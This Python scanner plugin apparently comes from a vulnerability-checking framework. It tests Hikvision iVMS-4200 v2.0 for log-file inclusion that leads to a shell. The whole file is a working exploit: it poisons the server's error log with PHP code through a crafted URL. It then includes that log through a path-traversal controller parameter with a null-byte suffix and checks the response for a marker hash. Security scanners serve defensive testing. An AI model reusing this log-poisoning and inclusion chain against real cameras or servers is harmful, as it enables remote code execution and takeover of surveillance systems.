#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'ontheway'
#iVMS-4200 v2.0 log file include

'''
海康威视IVMS系列2.0 日志文件包含getshell
'''
import re

def assign(service, arg):
    if service == "DVRDVS-Webs":
            return True, arg
    
def audit(arg):
    url = arg
    exp1 = "\"" + url + "/<?php echo '03815b953d00d9d146f629d6f6c29dc7';?>\""
    exp2 = url + "/index.php?controller=../../../../Server/logs/error.log%00.php"
    curl.curl(exp1)
    code ,_ ,body ,_,_ = curl.curl(exp2)
    if code ==200:
        if re.findall(r'03815b953d00d9d146f629d6f6c29dc7',body):
            security_hole('file include:%s' % exp2)
if __name__ == '__main__':
    from dummy import *
    audit(assign('DVRDVS-Webs', 'http://www.example.com/')[1])
